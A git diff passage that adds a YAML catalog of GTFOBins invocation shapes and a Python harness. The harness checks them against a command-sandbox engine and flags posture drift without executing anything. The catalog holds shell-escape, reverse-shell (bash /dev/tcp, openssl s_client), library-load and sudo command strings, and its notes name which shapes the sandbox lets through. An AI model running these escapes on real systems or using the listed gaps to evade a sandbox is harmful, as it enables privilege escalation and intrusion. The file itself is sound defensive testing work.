++        note: "GTFOBins file-write via -fprintf: live ALLOW through the allow-find-safe rule (the rule is not file-write blind)."
++
++  - name: "awk"
++    rationale: "Text-processing language: reading and printing files is its job; its system() escape is a full shell and is not accepted."
++    classes:
++      - class: "file-read"
++        invocation: "awk '{print}' /etc/hostname"
++        expected: "allowed-conscious"
++        note: "Text processing of a readable file."
++      - class: "shell"
++        invocation: "awk 'BEGIN {system(\"/bin/sh\")}'"
++        expected: "review"
++        note: "GTFOBins shell via system(): live ALLOW with no rule provenance."
++      - class: "file-write"
++        invocation: "awk 'BEGIN { print \"DATA\" > \"/tmp/tj059-sweep-awk-out\" }'"
++        expected: "review"
++        note: "GTFOBins file-write via awk redirection: live ALLOW, same capability as a shell redirect."
++
++  - name: "env"
++    rationale: "Two faces: `env <shell>` is caught by the auto-sandbox tier and never becomes a bare shell, while the LD_PRELOAD loader path is allowed and reaches the wrapper's env scrub rather than the rule engine."
++    classes:
++      - class: "shell"
++        invocation: "env /bin/sh"
++        expected: "review"
++        note: "Live MODIFY (builtin-net-fetch-pipe-qualified): namespace-wrapped rather than allowed. The wrap is not a conscious accept of env-as-shell."
++      - class: "library-load"
++        invocation: "env LD_PRELOAD=/tmp/tj059-sweep.so /bin/true"
++        expected: "review"
++        note: "Live ALLOW. The real defense is the standalone wrapper's env scrub (test_env_scrub.py), which the rule engine alone does not provide."
++      - class: "sudo"
++        invocation: "env sudo -l"
++        expected: "blocked"
++        note: "builtin-sudo still matches through the env prefix; wrappers do not hide the escalator."
++
++  - name: "nmap"
++    rationale: "Scanner: input-file reads and the interactive prompt are the two GTFOBins shapes; neither is consciously accepted, and neither is blocked."
++    classes:
++      - class: "file-read"
++        invocation: "nmap -iL /etc/hostname"
++        expected: "review"
++        note: "GTFOBins file-read via -iL: live ALLOW. Reads a readable file (and the content is used as targets)."
++      - class: "shell"
++        invocation: "nmap --interactive"
++        expected: "review"
++        note: "GTFOBins interactive shell escape: live ALLOW."
++      - class: "file-write"
++        invocation: "nmap -oG=/tmp/tj059-sweep-nmap-out 127.0.0.1"
++        expected: "allowed-conscious"
++        note: "Scan output to a writable path; a scan of loopback is the tool's designed job."
++
++  - name: "openssl"
++    rationale: "Crypto toolkit: encrypting a readable file gains nothing, but its reverse-shell (-s_client), library-load (-engine) and download shapes are unhandled."
++    classes:
++      - class: "file-read"
++        invocation: "openssl enc -in /etc/hostname"
++        expected: "allowed-conscious"
++        note: "Encrypting a readable file is the toolkit's purpose; no new capability."
++      - class: "reverse-shell"
++        invocation: "openssl s_client -quiet -connect 127.0.0.1:9"
++        expected: "review"
++        note: "GTFOBins reverse shell via s_client: live ALLOW. A TLS client is legitimately dual-use."
++      - class: "library-load"
++        invocation: "openssl req -engine /tmp/tj059-sweep.so"
++        expected: "review"
++        note: "GTFOBins library load via -engine: live ALLOW."
++
++  - name: "python3"
++    rationale: "Scripting runtime the fleet depends on: reading/writing files is the language's job, but shell-spawn and ctypes library load are full-code-execution paths that stay unresolved. Only the os.system/shutil shape is covered, by builtin-code-injection."
++    classes:
++      - class: "file-read"
++        invocation: "python3 -c 'print(open(\"/etc/hostname\").read())'"
++        expected: "allowed-conscious"
++        note: "Reading a readable file from the language runtime; the fleet's own tooling does this constantly."
++      - class: "shell"
++        invocation: "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\")'"
++        expected: "review"
++        note: "GTFOBins shell via os.execl: live ALLOW. Contrast with the os.system shape below, which IS blocked."
++      - class: "command"
++        invocation: "python3 -c 'import os; os.system(\"id\")'"
++        expected: "blocked"
++        note: "builtin-code-injection matches os.system(. The single covered python execution shape."
++      - class: "library-load"
++        invocation: "python3 -c 'from ctypes import cdll; cdll.LoadLibrary(\"/tmp/tj059-sweep.so\")'"
++        expected: "review"
++        note: "GTFOBins library load via ctypes: live ALLOW."
++
++  - name: "perl"
++    rationale: "Same class of runtime as python3: text processing is consciously allowed, `perl -e 'exec ...'` is a full shell and is unresolved."
++    classes:
++      - class: "file-read"
++        invocation: "perl -ne 'print' /etc/hostname"
++        expected: "allowed-conscious"
++        note: "One-liner text processing of a readable file."
++      - class: "shell"
++        invocation: "perl -e 'exec \"/bin/sh\"'"
++        expected: "review"
++        note: "GTFOBins shell via exec: live ALLOW."
++
++  - name: "ruby"
++    rationale: "Same class as perl/python3, plus a Fiddle library-load path; none of the execution shapes are blocked."
++    classes:
++      - class: "file-read"
++        invocation: "ruby -e 'puts File.read(\"/etc/hostname\")'"
++        expected: "allowed-conscious"
++        note: "Reading a readable file from the runtime."
++      - class: "shell"
++        invocation: "ruby -e 'exec \"/bin/sh\"'"
++        expected: "review"
++        note: "GTFOBins shell via exec: live ALLOW."
++      - class: "library-load"
++        invocation: "ruby -e 'require \"fiddle\"; Fiddle.dlopen(\"/tmp/tj059-sweep.so\")'"
++        expected: "review"
++        note: "GTFOBins library load via Fiddle.dlopen: live ALLOW."
++
++  - name: "php"
++    rationale: "The engine covers ONE php execution shape (bare exec) and misses the rest of the family (system, passthru, popen, pcntl_exec) — a partial block worth pinning so it is not mistaken for coverage."
++    classes:
++      - class: "file-write"
++        invocation: "php -r 'file_put_contents(\"/tmp/tj059-sweep-out\", \"DATA\");'"
++        expected: "allowed-conscious"
++        note: "Writing a writable path; the language's designed job."
++      - class: "command"
++        invocation: "php -r 'exec(\"/bin/true\");'"
++        expected: "blocked"
++        note: "builtin-code-injection matches bare exec(. The only php execution shape the engine covers."
++      - class: "shell"
++        invocation: "php -r 'system(\"/bin/sh -i\");'"
++        expected: "review"
++        note: "GTFOBins shell via system(): live ALLOW — the covered/missed asymmetry inside one binary."
++      - class: "command"
++        invocation: "php -r 'pcntl_exec(\"/bin/sh\");'"
++        expected: "review"
++        note: "GTFOBins shell via pcntl_exec: live ALLOW. The word boundary before exec( is why this escapes the code-injection rule."
++
++  - name: "bash"
++    rationale: "The shell itself: running commands and reading/writing files is what the jail expects, so those paths are consciously allowed; the /dev/tcp reverse shell is a conscious block; the loadable-builtin path is not accepted."
++    classes:
++      - class: "file-write"
++        invocation: "bash -c 'echo DATA >/tmp/tj059-sweep-out'"
++        expected: "allowed-conscious"
++        note: "A shell writing a writable path."
++      - class: "file-read"
++        invocation: "bash -c 'echo \"$(</etc/hostname)\"'"
++        expected: "allowed-conscious"
++        note: "A shell reading a readable path."
++      - class: "shell"
++        invocation: "bash -c 'id'"
++        expected: "review"
++        note: "Bare nested shell: live ALLOW with no rule provenance."
++      - class: "reverse-shell"
++        invocation: "bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/9 <&1'"
++        expected: "blocked"
++        note: "builtin-net-devtcp-redirect. The GTFOBins bash reverse shell as shipped."
++      - class: "library-load"
++        invocation: "bash -c 'enable -f /tmp/tj059-sweep.so x'"
++        expected: "review"
++        note: "GTFOBins library load via enable -f: live ALLOW."
++
++  - name: "nice"
++    rationale: "Process-niceness wrapper: it can carry any command, so bare `nice /bin/sh` is unresolved, but the block rules still see through it to an escalator."
++    classes:
++      - class: "shell"
++        invocation: "nice /bin/sh"
++        expected: "review"
++        note: "GTFOBins shell via nice: live ALLOW. The wrapper is transparent to the shell it launches."
++      - class: "shell"
++        invocation: "nice -n 5 /bin/sh -p"
++        expected: "review"
++        note: "GTFOBins setuid-restore form (-p): live ALLOW."
++      - class: "sudo"
++        invocation: "nice sudo -l"
++        expected: "blocked"
++        note: "builtin-sudo matches through the wrapper; `nice` does not hide the escalator."
++
++  - name: "time"
++    rationale: "Timing wrapper, same shape as nice: it passes an arbitrary command through, and the block rules read the inner command anyway."
++    classes:
++      - class: "shell"
++        invocation: "time /bin/sh"
++        expected: "review"
++        note: "GTFOBins shell via time: live ALLOW."
++      - class: "sudo"
++        invocation: "time sudo -l"
++        expected: "blocked"
++        note: "builtin-sudo matches through the wrapper."
++
++  - name: "timeout"
++    rationale: "Timeout wrapper, same shape as nice/time; `timeout 0 <cmd>` is the GTFOBins way to defeat a timeout, and the block rules still match the inner command."
++    classes:
++      - class: "shell"
++        invocation: "timeout 0 /bin/sh"
++        expected: "review"
++        note: "GTFOBins shell via timeout 0: live ALLOW."
++      - class: "sudo"
++        invocation: "timeout 5 sudo -l"
++        expected: "blocked"
++        note: "builtin-sudo matches through the wrapper."
+diff --git a/scripts/gtfobins-sweep.py b/scripts/gtfobins-sweep.py
+new file mode 100644
+index 0000000..6f1e0fb
+--- /dev/null
++++ b/scripts/gtfobins-sweep.py
+@@ -0,0 +1,626 @@
++#!/usr/bin/env python3
++"""GTFOBins-sweep harness — catalog shape vs live engine verdicts (TJ-GAP-059).
++
++GTFOBins describes several hundred binaries that can spawn a shell, read or
++write an arbitrary file, load a library, or open a reverse shell. terminal-jail
++deliberately does NOT try to block them all: vim, less, git and tar are the
++legitimate tools of the very work the jail protects, so blocking them destroys
++the sandbox's reason to exist. The consequence is that most of the GTFOBins
++surface is ALLOWED — and until now that allow surface was invisible and
++unguarded: nobody could say which invocation shapes the fleet had consciously
++accepted, and a rules change could silently flip one of those decisions.
++
++This harness is the measuring stick, not the wall. It sweeps a small
++machine-readable seed catalog of real GTFOBins invocation shapes against the
++live engine and reports, per GTFOBins function class (shell, sudo, file-read,
++file-write, library-load, reverse-shell, ...):
++
++  * a verdict matrix   — rows = function class, columns = live verdict counts,
++                         with the binaries behind each count,
++  * a coverage line    — how many recorded postures still match live verdicts,
++  * POSTURE-DRIFT      — definitive postures the engine no longer honors,
++  * REVIEW             — live ALLOW/MODIFY/SANDBOX verdicts with no conscious
++                         posture recorded yet (the queue for a human decision).
++
++Postures (per binary, per function class) are one of:
++
++  allowed-conscious  the engine allows the invocation and we accept it — the
++                     dual-use tool doing its designed job (say, `git status`).
++  blocked            the engine must block it (an accepted protection, say
++                     `sudo`). A silently-allowed `blocked` posture is the
++                     regression this harness exists to catch.
++  review             no conscious decision yet. The live verdict is reported
++                     for visibility but never fails the gate.
++
++It changes no rules and blocks nothing: it measures the shipped engine and
++makes the conscious ALLOW decisions visible and regression-guarded in CI.
++
++Hermetic by design: the sweep constructs the engine's Config with rule
++directories that cannot exist, so it measures the SHIPPED built-ins
++(BUILTIN_BLOCKLIST / BUILTIN_SANDBOX / BUILTIN_ALLOWLIST) identically on a dev
++box, a hardened host (which has the 00-builtins.yaml mirror installed as user
++rules), and CI. A host-local softening rule must not be able to edit what this
++report claims.
++
++The catalog is a SEED: ~18 binaries, one representative invocation per function
++class, every entry carrying a rationale. It is meant to grow.
++
++Usage:
++    python3 scripts/gtfobins-sweep.py                    # full text report, exit 0
++    python3 scripts/gtfobins-sweep.py --format json      # same data as JSON
++    python3 scripts/gtfobins-sweep.py --check            # exit 1 on posture drift
++    python3 scripts/gtfobins-sweep.py --check --stdout   # explicit stdout form
++
++Requires PyYAML (a declared runtime dependency of this repo) and the repo's
++`plugin/` directory on sys.path (bootstrapped below, so running from the repo
++root works with the repo .venv python even when the package is not installed).
++"""
++from __future__ import annotations
++
++import argparse
++import json
++import sys
++from dataclasses import dataclass
++from pathlib import Path
++from types import ModuleType
++from typing import Any, Sequence
++
++import yaml
++
++REPO_ROOT = Path(__file__).resolve().parent.parent
++PLUGIN_DIR = REPO_ROOT / "plugin"
++DEFAULT_CATALOG = REPO_ROOT / "scripts" / "gtfobins-catalog-seed.yaml"
++
++# Rule directories that can never exist (this tree is never created): the sweep
++# must observe the shipped engine's built-ins, never a host's rules.d overrides.
++_NO_RULES_DIR = str(REPO_ROOT / "scripts" / ".gtfobins-sweep-no-rules.d")
++
++POSTURE_ALLOWED_CONSCIOUS = "allowed-conscious"
++POSTURE_BLOCKED = "blocked"
++POSTURE_REVIEW = "review"
++POSTURES = (POSTURE_ALLOWED_CONSCIOUS, POSTURE_BLOCKED, POSTURE_REVIEW)
++
++# Mirrors terminal_jail.interruptor.types.Action (plain str constants in the
++# engine). A test pins these equal to the engine's own attributes so the report
++# cannot drift from the engine's vocabulary.
++ACTION_ALLOW = "allow"
++ACTION_BLOCK = "block"
++ACTION_MODIFY = "modify"
++ACTION_WARN = "warn"
++ACTION_COLUMNS = (ACTION_BLOCK, ACTION_ALLOW, ACTION_MODIFY, ACTION_WARN)
++
++CLASS_MATCH = "match"
++CLASS_DRIFT_UNPROTECTED = "DRIFT-UNPROTECTED"
++CLASS_DRIFT_OVERBLOCKED = "DRIFT-OVERBLOCKED"
++CLASS_REVIEW = "REVIEW"
++
++EXIT_OK = 0
++EXIT_DRIFT = 1
++EXIT_CATALOG_ERROR = 2
++
++_TOP_KEYS = frozenset({"schema_version", "entries"})
++_ENTRY_KEYS = frozenset({"name", "rationale", "classes"})
++_CLASS_KEYS = frozenset({"class", "invocation", "expected", "note"})
++
++CHECK_RULE_HELP = """\
++--check exit rule:
++  exit 1 when a DEFINITIVE posture drifted: an expected=blocked row that no
++  longer blocks (DRIFT-UNPROTECTED) or an expected=allowed-conscious row that is
++  no longer allowed (DRIFT-OVERBLOCKED). Rows marked expected=review have no
++  conscious posture yet, so their live verdict is listed in the REVIEW section
++  but never fails --check -- that is what lets the seed catalog carry observed
++  ALLOW vectors while CI stays green.
++  Exit 2 (fatal) only on catalog load/parse errors, naming the catalog path.
++  Without --check the report is advisory and the exit code is 0.
++"""
++
++
++class CatalogError(Exception):
++    """Raised for any catalog load/parse/validation failure."""
++
++
++@dataclass(frozen=True)
++class CatalogRow:
++    """One (binary, function class) row of the seed catalog."""
++
++    binary: str
++    function_class: str
++    invocation: str
++    expected: str
++    rationale: str
++    note: str = ""
++
++
++@dataclass(frozen=True)
++class RowResult:
++    """A catalog row plus the live engine verdict for its invocation."""
++
++    binary: str
++    function_class: str
++    invocation: str
++    expected: str
++    rationale: str
++    note: str
++    action: str
++    rule_id: str | None
++    classification: str
++
++    @property
++    def drifted(self) -> bool:
++        """True when a definitive posture no longer matches the live verdict."""
++        return self.classification in (
++            CLASS_DRIFT_UNPROTECTED,
++            CLASS_DRIFT_OVERBLOCKED,
++        )
++
++
++@dataclass(frozen=True)
++class SweepReport:
++    """The catalog path plus every swept row."""
++
++    catalog_path: str
++    results: tuple[RowResult, ...]
++
++
++# ── engine access ──────────────────────────────────────────────────
++
++
++def load_engine() -> ModuleType:
++    """Import the live engine module, bootstrapping sys.path first.
++
++    The import is deliberately function-local: importing this module must have
++    no side effects, and the repo checkout's ``plugin/`` directory is where
++    ``terminal_jail`` lives when the package is not pip-installed (the CI test
++    job installs pytest + PyYAML only).
++    """
++    if str(PLUGIN_DIR) not in sys.path:
++        sys.path.insert(0, str(PLUGIN_DIR))
++    import terminal_jail.interruptor as engine
++
++    return engine
++
++
++def hermetic_config(engine: ModuleType) -> Any:
++    """Engine config that ignores every host rule directory (see module doc)."""
++    return engine.Config(
++        mode="enforce",
++        system_rules_dir=_NO_RULES_DIR,
++        user_rules_dir=_NO_RULES_DIR,
++    )
++
++
++def classify(expected: str, action: str) -> str:
++    """Map (expected posture, live action) onto a classification label."""
++    if expected == POSTURE_REVIEW:
++        return CLASS_REVIEW
++    if expected == POSTURE_BLOCKED:
++        return CLASS_MATCH if action == ACTION_BLOCK else CLASS_DRIFT_UNPROTECTED
++    return CLASS_MATCH if action == ACTION_ALLOW else CLASS_DRIFT_OVERBLOCKED
++
++
++def sweep(rows: Sequence[CatalogRow]) -> tuple[RowResult, ...]:
++    """Evaluate every catalog row in-process against the live engine.
++
++    Only string evaluation happens here: the invocations are matched by the
++    engine's rule patterns, never executed.
++    """
++    engine = load_engine()
++    config = hermetic_config(engine)
++    results: list[RowResult] = []
++    for row in rows:
++        verdict = engine.intercept(row.invocation, config=config)
++        action = str(verdict.action)
++        rule_id = verdict.rule_id if isinstance(verdict.rule_id, str) else None
++        results.append(
++            RowResult(
++                binary=row.binary,
++                function_class=row.function_class,
++                invocation=row.invocation,
++                expected=row.expected,
++                rationale=row.rationale,
++                note=row.note,
++                action=action,
++                rule_id=rule_id,
++                classification=classify(row.expected, action),
++            )
++        )
++    return tuple(results)
++
++
++# ── catalog loading ────────────────────────────────────────────────
++
++
++def _one_line(text: str) -> str:
++    """Collapse YAML folded/block scalars into one whitespace-normal line."""
++    return " ".join(text.split())
++
++
++def load_catalog(path: Path) -> tuple[CatalogRow, ...]:
++    """Load and validate the seed catalog; raise CatalogError on any problem."""
++    if not path.is_file():
++        raise CatalogError(f"catalog not found: {path}")
++    try:
++        text = path.read_text(encoding="utf-8")
++    except OSError as exc:
++        raise CatalogError(f"{path}: unreadable: {exc}") from exc
++    try:
++        raw = yaml.safe_load(text)
++    except yaml.YAMLError as exc:
++        raise CatalogError(f"{path}: invalid YAML: {exc}") from exc
++
++    if not isinstance(raw, dict):
++        raise CatalogError(f"{path}: top level must be a mapping with 'entries'")
++    unknown = sorted(set(raw) - _TOP_KEYS)
++    if unknown:
++        raise CatalogError(f"{path}: unknown top-level key(s): {', '.join(unknown)}")
++    entries = raw.get("entries")
++    if not isinstance(entries, list) or not entries:
++        raise CatalogError(f"{path}: 'entries' must be a non-empty list")
++
++    rows: list[CatalogRow] = []
++    seen: set[str] = set()
++    for index, entry in enumerate(entries):
++        rows.extend(_parse_entry(path, index, entry, seen))
++    return tuple(rows)
++
++
++def _parse_entry(
++    path: Path, index: int, entry: Any, seen: set[str]
++) -> list[CatalogRow]:
++    """Validate one catalog entry and return its rows."""
++    where = f"{path}: entries[{index}]"
++    if not isinstance(entry, dict):
++        raise CatalogError(f"{where}: must be a mapping")
++    name = entry.get("name")
++    if not isinstance(name, str) or not name.strip():
++        raise CatalogError(f"{where}: 'name' must be a non-empty string")
++    name = name.strip()
++    where = f"{path}: entries[{index}] ('{name}')"
++    if name in seen:
++        raise CatalogError(f"{where}: duplicate binary name")
++    seen.add(name)
++    unknown = sorted(set(entry) - _ENTRY_KEYS)
++    if unknown:
++        raise CatalogError(f"{where}: unknown key(s): {', '.join(unknown)}")
++    rationale = entry.get("rationale")
++    if not isinstance(rationale, str) or not rationale.strip():
++        raise CatalogError(f"{where}: 'rationale' must be a non-empty string")
++    classes = entry.get("classes")
++    if not isinstance(classes, list) or not classes:
++        raise CatalogError(f"{where}: 'classes' must be a non-empty list")
++
++    rows: list[CatalogRow] = []
++    for cls_index, cls in enumerate(classes):
++        rows.append(_parse_class(path, where, cls_index, cls, name, rationale))
++    return rows
++
++
++def _parse_class(
++    path: Path,
++    entry_where: str,
++    index: int,
++    cls: Any,
++    name: str,
++    rationale: str,
++) -> CatalogRow:
++    """Validate one (binary, function class) row."""
++    where = f"{entry_where}: classes[{index}]"
++    if not isinstance(cls, dict):
++        raise CatalogError(f"{where}: must be a mapping")
++    unknown = sorted(set(cls) - _CLASS_KEYS)
++    if unknown:
++        raise CatalogError(f"{where}: unknown key(s): {', '.join(unknown)}")
++    function_class = cls.get("class")
++    if not isinstance(function_class, str) or not function_class.strip():
++        raise CatalogError(f"{where}: 'class' must be a non-empty string")
++    invocation = cls.get("invocation")
++    if not isinstance(invocation, str) or not invocation.strip():
++        raise CatalogError(f"{where}: 'invocation' must be a non-empty string")
++    if "\n" in invocation:
++        raise CatalogError(f"{where}: 'invocation' must be a single line")
++    expected = cls.get("expected")
++    if expected not in POSTURES:
++        raise CatalogError(
++            f"{where}: 'expected' must be one of {'/'.join(POSTURES)}, "
++            f"got {expected!r}"
++        )
++    note = cls.get("note", "")
++    if not isinstance(note, str):
++        raise CatalogError(f"{where}: 'note' must be a string when present")
++    return CatalogRow(
++        binary=name,
++        function_class=function_class.strip(),
++        invocation=invocation.strip(),
++        expected=expected,
++        rationale=_one_line(rationale),
++        note=_one_line(note),
++    )
++
++
++# ── report data ────────────────────────────────────────────────────
++
++
++def coverage(results: Sequence[RowResult]) -> tuple[int, int, float]:
++    """Return (matched, definitive_total, percent) over definitive postures.
++
++    ``expected=review`` rows carry no expectation, so they are excluded from
++    the denominator -- coverage is "of the decisions we made, how many still
++    hold", not "how much of the GTFOBins surface we have decided about".
++    """
++    definitive = [r for r in results if r.expected != POSTURE_REVIEW]
++    matched = sum(1 for r in definitive if r.classification == CLASS_MATCH)
++    total = len(definitive)
++    percent = round(100.0 * matched / total, 1) if total else 0.0
++    return matched, total, percent
++
++
++def action_counts(results: Sequence[RowResult]) -> dict[str, int]:
++    """Live verdict counts for every action seen, in a stable order."""
++    counts: dict[str, int] = {action: 0 for action in ACTION_COLUMNS}
++    for result in results:
++        counts[result.action] = counts.get(result.action, 0) + 1
++    return counts
++
++
++def matrix(results: Sequence[RowResult]) -> dict[str, dict[str, Any]]:
++    """Per-function-class live verdict counts plus the binaries behind them."""
++    out: dict[str, dict[str, Any]] = {}
++    for result in results:
++        cell = out.setdefault(result.function_class, {})
++        cell[result.action] = cell.get(result.action, 0) + 1
++        # Sorted set: a binary appears once per distinct verdict, so a class
++        # where one binary straddles block/allow keeps that contrast (php) while
++        # two same-verdict rows of one binary (nice/shell) do not duplicate.
++        cell.setdefault("binaries", set()).add(f"{result.binary}({result.action})")
++    for cell in out.values():
++        cell["binaries"] = sorted(cell["binaries"])
++    return out
++
++
++def drifted(results: Sequence[RowResult]) -> list[RowResult]:
++    """Rows whose definitive posture no longer matches the live verdict."""
++    return [r for r in results if r.drifted]
++
++
++def reviewed(results: Sequence[RowResult]) -> list[RowResult]:
++    """Rows with no conscious posture yet (live verdict shown for visibility)."""
++    return [r for r in results if r.classification == CLASS_REVIEW]
++
++
++def _rule(r: RowResult) -> str:
++    return r.rule_id or "-"
++
++
++# ── rendering ──────────────────────────────────────────────────────
++
++
++def render_text(report: SweepReport) -> str:
++    """Render the human report: matrix, coverage, drift, review, row detail."""
++    results = report.results
++    matched, total, percent = coverage(results)
++    drift = drifted(results)
++    review = reviewed(results)
++    counts = action_counts(results)
++    binaries = len({r.binary for r in results})
++
++    lines: list[str] = []
++    lines.append("=" * 78)
++    lines.append("GTFOBins sweep - catalog shape vs live engine verdicts (TJ-GAP-059)")
++    lines.append("=" * 78)
++    lines.append(f"catalog : {report.catalog_path}")
++    lines.append("engine  : hermetic Config - shipped built-ins, host rules.d ignored")
++    lines.append(f"entries : {binaries} binaries / {len(results)} class rows")
++    lines.append(
++        "verdicts: "
++        + ", ".join(f"{action}={counts.get(action, 0)}" for action in ACTION_COLUMNS)
++    )
++    lines.append("")
++    lines.append("Function-class verdict matrix (live verdict counts, then binaries)")
++    lines.append("-" * 78)
++    header = f"{'function class':<16}"
++    for action in ACTION_COLUMNS:
++        header += f" {action:>6}"
++    header += "  binaries"
++    lines.append(header)
++    cells = matrix(results)
++    for function_class in sorted(cells):
++        cell = cells[function_class]
++        row = f"{function_class:<16}"
++        for action in ACTION_COLUMNS:
++            row += f" {cell.get(action, 0):>6}"
++        row += "  " + ", ".join(cell["binaries"])
++        lines.append(row)
++    lines.append("")
++    lines.append(
++        f"gtfobins-coverage: {matched}/{total} postures match expected "
++        f"({percent:.1f}%)"
++    )
++    lines.append(
++        f"review backlog   : {len(review)} row(s) with no conscious posture yet "
++        "(excluded from coverage)"
++    )
++    lines.append("")
++
++    if drift:
++        lines.append("POSTURE-DRIFT (definitive postures the engine no longer honors)")
++        lines.append("-" * 78)
++        for r in drift:
++            lines.append(
++                f"{r.classification:<18} {r.binary}/{r.function_class} "
++                f"expected={r.expected} live={r.action} rule={_rule(r)} "
++                f"invocation={r.invocation}"
++            )
++    else:
++        lines.append("POSTURE-DRIFT (definitive postures the engine no longer honors)")
++        lines.append("-" * 78)
++        lines.append("none - every definitive posture matches the live engine verdict")
++    lines.append("")
++
++    if review:
++        lines.append("REVIEW (live verdicts not yet consciously accepted)")
++        lines.append("-" * 78)
++        for r in review:
++            lines.append(
++                f"REVIEW  {r.binary}/{r.function_class} live={r.action} "
++                f"rule={_rule(r)} invocation={r.invocation}"
++            )
++    else:
++        lines.append("REVIEW (live verdicts not yet consciously accepted)")
++        lines.append("-" * 78)
++        lines.append("none - every row carries a conscious posture")
++    lines.append("")
++
++    lines.append("Row detail (catalog order)")
++    lines.append("-" * 78)
++    lines.append(
++        f"{'binary':<10} {'class':<12} {'expected':<17} {'live':<7} "
++        f"{'rule':<32} invocation"
++    )
++    for r in results:
++        lines.append(
++            f"{r.binary:<10} {r.function_class:<12} {r.expected:<17} "
++            f"{r.action:<7} {_rule(r):<32} {r.invocation}"
++        )
++    lines.append("")
++    return "\n".join(lines)
++
++
++def report_payload(report: SweepReport) -> dict[str, Any]:
++    """The report as plain data (shared by --format json)."""
++    results = report.results
++    matched, total, percent = coverage(results)
++    return {
++        "catalog": report.catalog_path,
++        "engine": "hermetic",
++        "entries": {
++            "binaries": len({r.binary for r in results}),
++            "rows": len(results),
++        },
++        "verdicts": action_counts(results),
++        "coverage": {
++            "matched": matched,
++            "total": total,
++            "percent": percent,
++            "review_rows": len(reviewed(results)),
++        },
++        "matrix": matrix(results),
++        "rows": [
++            {
++                "binary": r.binary,
++                "class": r.function_class,
++                "invocation": r.invocation,
++                "expected": r.expected,
++                "action": r.action,
++                "rule_id": r.rule_id,
++                "classification": r.classification,
++                "rationale": r.rationale,
++                "note": r.note,
++            }
++            for r in results
++        ],
++        "drift": [
++            {
++                "classification": r.classification,
++                "binary": r.binary,
++                "class": r.function_class,
++                "invocation": r.invocation,
++                "expected": r.expected,
++                "action": r.action,
++                "rule_id": r.rule_id,
++            }
++            for r in drifted(results)
++        ],
++        "review": [
++            {
++                "binary": r.binary,
++                "class": r.function_class,
++                "invocation": r.invocation,
++                "action": r.action,
++                "rule_id": r.rule_id,
++            }
++            for r in reviewed(results)
++        ],
++    }
++
++
++def render_json(report: SweepReport) -> str:
++    """Byte-stable JSON rendering (sorted keys) of the same data as the text."""
++    return json.dumps(report_payload(report), indent=2, sort_keys=True)
++
++
++# ── CLI ────────────────────────────────────────────────────────────
++
++
++def build_parser() -> argparse.ArgumentParser:
++    """Build the argument parser (its epilog documents the --check rule)."""
++    parser = argparse.ArgumentParser(
++        description=(
++            "Sweep the GTFOBins seed catalog against the live terminal-jail "
++            "engine and report per-function-class verdicts, coverage, posture "
++            "drift and the review backlog. Measurement only: this changes no "
++            "rules."
++        ),
++        epilog=CHECK_RULE_HELP,
++        formatter_class=argparse.RawDescriptionHelpFormatter,
++    )
++    parser.add_argument(
++        "--catalog",
++        default=str(DEFAULT_CATALOG),
++        help=(
++            "catalog YAML to sweep (default: "
++            "scripts/gtfobins-catalog-seed.yaml, resolved from the repo root)"
++        ),
++    )
++    parser.add_argument(
++        "--stdout",
++        action="store_true",
++        help=(
++            "print the report to stdout and write no files (this is already "
++            "the default; accepted for CLI parity with scripts/rule-catalog.py, "
++            "whose default writes docs/)"
++        ),
++    )
++    parser.add_argument(
++        "--check",
++        action="store_true",
++        help="exit 1 on posture drift; see the exit rule below",
++    )
++    parser.add_argument(
++        "--format",
++        choices=("text", "json"),
++        default="text",
++        help="report format (default: text)",
++    )
++    return parser
++
++
++def main(argv: Sequence[str] | None = None) -> int:
++    """Run the sweep. Returns 0 (ok), 1 (--check drift); exits 2 on catalog error."""
++    args = build_parser().parse_args(argv)
++    catalog_path = Path(args.catalog)
++    try:
++        rows = load_catalog(catalog_path)
++    except CatalogError as exc:
++        print(f"gtfobins-sweep: {exc}", file=sys.stderr)
++        raise SystemExit(EXIT_CATALOG_ERROR) from exc
++
++    report = SweepReport(catalog_path=str(catalog_path), results=sweep(rows))
++    drift = drifted(report.results)
++
++    if args.format == "json":
++        sys.stdout.write(render_json(report) + "\n")
++    else:
++        sys.stdout.write(render_text(report) + "\n")
++        if args.check:
++            if drift:
++                print(f"[check] FAIL - {len(drift)} posture(s) drifted")
++            else:
++                print("[check] OK - no posture drift")
++
++    if args.check and drift:
++        return EXIT_DRIFT
++    return EXIT_OK
++
++
++if __name__ == "__main__":
++    raise SystemExit(main())
